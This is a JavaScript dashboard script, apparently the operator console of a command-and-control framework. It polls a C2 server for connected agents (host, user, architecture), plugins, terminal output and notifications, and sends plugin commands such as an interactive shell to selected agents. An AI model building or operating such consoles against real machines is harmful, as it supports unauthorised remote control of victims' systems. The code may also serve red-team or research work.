GLOBAL={}
GLOBAL['selected'] = {}
function createToast(title,body){
    notification_id="notification_" + Math.random()
    toast_template =`<div class="position-fixed top-0 end-0 p-3" style="z-index: 12">
                        <div id="${notification_id}" class="toast" role="alert" aria-live="assertive" aria-atomic="true">
                        <div class="toast-header">
                            <small>üö®</small>
                            <strong class="me-auto">${title}</strong>
                            <button type="button" class="btn-close" data-bs-dismiss="toast" aria-label="Close"></button>
                        </div>
                        <div class="toast-body">
                            ${body}
                        </div>
                        </div>
                    </div>`
    template = document.createElement('template');
    template.innerHTML = toast_template
    result = template.content.children[0];
    document.getElementById("toast-container").appendChild(result)
    mytoast=new bootstrap.Toast(document.getElementById(notification_id))
    mytoast.show()


}

function AgentMenuCmd(agent,command){
    command  = command.split("_")
    switch(command[0]){
        case "plugin":

            plugin_id = command[1]
            console.log(`Running Plugin ${command[1]} on ${agent}`)
            if(command[1]=="bb3776e28f"){ //intelli shell
                myTerminal.push(TERMINAL['plugin']['shell'])
            }else{
                myTerminal.push(TERMINAL['plugin']['interpreter'],TERMINAL['plugin']['options'])
            }
            
            myTerminal.set_prompt(`Plugin>${GLOBAL['plugins'][plugin_id]['name']}>${agent}>`)
            GLOBAL['selected']['agent'] = agent
            GLOBAL['selected']['plugin'] =  plugin_id
            myTerminal.echo(`\nEntering [[;white;]${GLOBAL['plugins'][plugin_id]['name']}] menu ...\n`)
            

            
            break;
        case "info":
            console.log("Run info command")
            break;
        default:
            //Really shouldnt come here
            break
    }

}

function setAgentContextMenu(agentid){
    $(`#${agentid}`).contextMenu({

        menuSelector: "#contextMenu",
        menuSelected: function (invokedOn, selectedMenu) {
            var msg = "You selected the menu item '" + selectedMenu.text() +
                "' on the value '" + invokedOn.get(0).id /*invokedOn.text()*/ + "'" ;
            //console.log(invokedOn[0].id)
            //console.log(invokedOn)
           // alert(invokedOn[0].closest("li[id^='agent_']").id)
           targetAgent = invokedOn[0].closest("li[id^='agent_']").id.split('_')[1]
           cmd = selectedMenu.data("cmd")
           console.log(invokedOn[0].closest("li[id^='agent_']").id)
           console.log(selectedMenu.data("cmd"))
            AgentMenuCmd(targetAgent,cmd);

        }
    });
  }
  

function pollAgent() {
    $.ajax({
        type: "GET",
        url: `${C2_URL}/ui/agents`,
        success: function (data) {
            let agents = data

            if (Object.keys(agents).length ==0){ //If no agent just exit
                console.log("No Agent")
                return
            }
            $("#agent")[0].innerHTML=""
            for( x in agents ){

                time_elapse = (Date.now()/1000)- agents[x].last_seen
                switch(true){
                    case (time_elapse <= 10):
                        status_color='bg-success'
                        break;
                    case (time_elapse > 10  && time_elapse <20 ):
                        status_color='bg-warning'
                        break;
                    default:
                        status_color='bg-danger'
                        break;
                }
                

                agent_li = Object.assign(
                document.createElement(`li`),
                {
                    classList: "list-group-item d-flex justify-content-between align-items-start",
                    id:`agent_${x}`,
                    innerHTML: `<div class="ms-2 me-auto">
                              <div class="fw-bold" >${x}</div>
                              <span class="badge bg-secondary">host:${agents[x].host}</span> 
                              <span class="badge bg-secondary">user:${agents[x].user} </span> 
                              <span class="badge bg-secondary">arch:${agents[x].arch}</span> 
                            </div>
                            <span id='${x}_status' class="badge ${status_color} rounded-pill">   üåê  </span>`
                });
                $('#agent')[0].appendChild(agent_li)
                setAgentContextMenu(`agent_${x}`);
            }
            
            //console.log(data);

        }
    });


}

function pollPlugins() {
    $.ajax({
        type: "GET",
        url: `${C2_URL}/ui/plugins`,
        success: function (data) {
            console.log(data)
            //GLOBAL['plugins'] = JSON.parse(data)
            GLOBAL['plugins'] = data
            $("#plugin_list").empty()
            for (pluginID in GLOBAL['plugins']){
                plugin_li = Object.assign(
                    document.createElement(`li`),
                    {
                        classList: "dropdown-item",
                        id:`plugin_${pluginID}`,
                        innerHTML: `<a tabindex="-1" href="#" class="dropdown-item" data-cmd="plugin_${pluginID}">${GLOBAL['plugins'][pluginID]['name']}</a>`
                    });

                $("#plugin_list")[0].appendChild(plugin_li)

            }
            
            //<li></li>
        

        }
    });


}

function pollTerminal(){
    $.ajax({
        type: "GET",
        url: `${C2_URL}/ui/terminal`,
        success: function (data) {
            console.log(data)
            for (x in data){

                myTerminal.echo(data[x].result)
            }
  

        }
    });

}

function pollNotification(){
    $.ajax({
        type: "GET",
        url: `${C2_URL}/ui/notification`,
        success: function (data) {

            if("title" in data && "body" in data){    
                createToast(data['title'], data['body'])
            }
        }
    });

}

function sendAgentCmd(){
    $.ajax({
        type: "POST",
        url: `${C2_URL}/ui/sendAgentCmd`,
        data: JSON.stringify(GLOBAL['selected']),
        contentType: "application/json; charset=utf-8",
        dataType: "json",
        success: function(data){alert(data);},
        failure: function(errMsg) {
            alert(errMsg);
        }
  });
}

setInterval(pollAgent, 1000);
//pollPlugins();
setInterval(pollPlugins, 1000);
setInterval(pollTerminal,1000)
setInterval(pollNotification,1000)


